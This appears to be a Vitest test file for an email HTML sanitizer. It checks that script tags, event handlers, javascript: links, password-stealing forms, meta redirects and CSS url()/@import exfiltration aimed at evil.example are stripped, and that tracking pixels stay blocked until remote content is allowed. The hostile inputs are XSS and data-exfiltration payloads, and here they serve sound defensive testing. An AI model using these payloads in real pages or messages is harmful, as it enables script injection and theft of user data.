// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { frameDocument, inlineImageMap, plainTextToHtml, sanitizeEmailHtml } from "./sanitize";

const blocked = { allowRemote: false, inlineImages: new Map<string, string>() };
const allowed = { allowRemote: true, inlineImages: new Map<string, string>() };
const clean = (html: string, options = blocked) => sanitizeEmailHtml(html, options);

describe("hostile HTML", () => {
  it("removes script tags", () => {
    const { html } = clean("<p>hi</p><script>alert(1)</script><SCRIPT src=//evil.example/x.js></SCRIPT>");
    expect(html).toBe("<p>hi</p>");
  });

  it("removes inline event handlers", () => {
    const { html } = clean('<img src="data:image/png;base64,AAAA" onerror="alert(1)"><div onmouseover="x()" onclick="y()">t</div><body onload=z()>');
    expect(html).not.toMatch(/on(error|mouseover|click|load)/i);
  });

  it("strips javascript:, vbscript: and data: links", () => {
    const { html } = clean('<a href="javascript:alert(1)">a</a><a href=" JaVaScRiPt:alert(1)">b</a><a href="vbscript:x">c</a><a href="data:text/html,<script>x</script>">d</a>');
    expect(html).not.toMatch(/javascript|vbscript|data:text/i);
    expect(html).not.toContain("href=");
  });

  it("removes forms and inputs", () => {
    const { html } = clean('<form action="https://evil.example/steal"><input name="password"><button formaction="https://evil.example">Go</button></form>');
    expect(html).not.toMatch(/<form|<input|<button|action=/i);
  });

  it("removes meta refresh and base", () => {
    const { html } = clean('<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><p>x</p>');
    expect(html).not.toMatch(/<meta|<base|refresh/i);
  });

  it("removes SVG with script and iframes/objects", () => {
    const { html } = clean('<svg onload="alert(1)"><script>alert(2)</script></svg><iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x">');
    expect(html).not.toMatch(/<svg|<script|<iframe|<object|<embed|alert/i);
  });

  it("drops CSS @import and remote url() exfiltration, including escaped forms", () => {
    const result = clean(`<style>@import url("https://evil.example/a.css"); @import 'https://evil.example/b.css';
      input[value^="a"]{background:url(https://evil.example/leak?a)}
      .x{background:u\\72l(https://evil.example/escaped)}
      .y{background-image:image-set("https://evil.example/set.png" 1x)}
      .z{behavior:url(x.htc);width:expression(alert(1))}</style>
      <div style="background:url('//evil.example/inline.png')">t</div>`);
    expect(result.html).not.toMatch(/evil\.example|@import|expression|behavior/i);
    expect(result.blockedRemote).toBeGreaterThanOrEqual(4);
  });

  it("blocks tracking pixels until remote content is allowed", () => {
    const tracker = '<img src="http://tracker.example/pixel.gif?u=1" width="1" height="1"><table><tr><td background="https://tracker.example/bg.png">x</td></tr></table>';
    const before = clean(tracker);
    expect(before.html).not.toContain("tracker.example");
    expect(before.blockedRemote).toBe(2);
    const after = clean(tracker, allowed);
    expect(after.html).toContain('src="http://tracker.example/pixel.gif?u=1"');
    expect(after.blockedRemote).toBe(0);
  });

  it("forces links to open safely in a new tab", () => {
    const { html } = clean('<a href="https://example.com" target="_self" rel="opener">x</a><a href="mailto:a@b.c">m</a>');
    expect(html).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a><a href="mailto:a@b.c" target="_blank" rel="noopener noreferrer">m</a>',
    );
  });

  it("keeps ordinary formatting, inline styles and data: images", () => {
    const { html } = clean('<table><tr><td style="color:red;padding:4px"><b>Bold</b> <img src="data:image/png;base64,iVBORw0KGgo=" alt="x"></td></tr></table>');
    expect(html).toContain('style="color:red;padding:4px"');
    expect(html).toContain("<b>Bold</b>");
    expect(html).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("rejects non-image data: URLs in img src", () => {
    const { html } = clean('<img src="data:text/html;base64,PHNjcmlwdD4=">');
    expect(html).not.toContain("data:text");
  });

  it("maps cid: images to inline data URLs and drops unknown ones", () => {
    const inlineImages = inlineImageMap([
      { id: "a", filename: "logo.png", contentType: "image/png", sizeBytes: 3, contentId: "<Logo@Mail>", isInline: true, content: new Uint8Array([1, 2, 3]).buffer },
    ]);
    const { html } = clean('<img src="cid:logo@mail"><img src="cid:missing">', { allowRemote: false, inlineImages });
    expect(html).toContain('src="data:image/png;base64,AQID"');
    expect(html).toMatch(/<img>$/);
  });
});

describe("frame document and plain text", () => {
  it("adds a strict CSP that only widens when remote content is allowed", () => {
    expect(frameDocument("x", false)).toContain("img-src data:;");
    expect(frameDocument("x", false)).toContain("default-src 'none'");
    expect(frameDocument("x", true)).toContain("img-src data: https: http:;");
  });

  it("escapes plain text and linkifies URLs", () => {
    const html = plainTextToHtml('<script>x</script> see https://example.com/a?b=1, thanks');
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain('<a href="https://example.com/a?b=1" target="_blank" rel="noopener noreferrer">https://example.com/a?b=1</a>, thanks');
  });
});
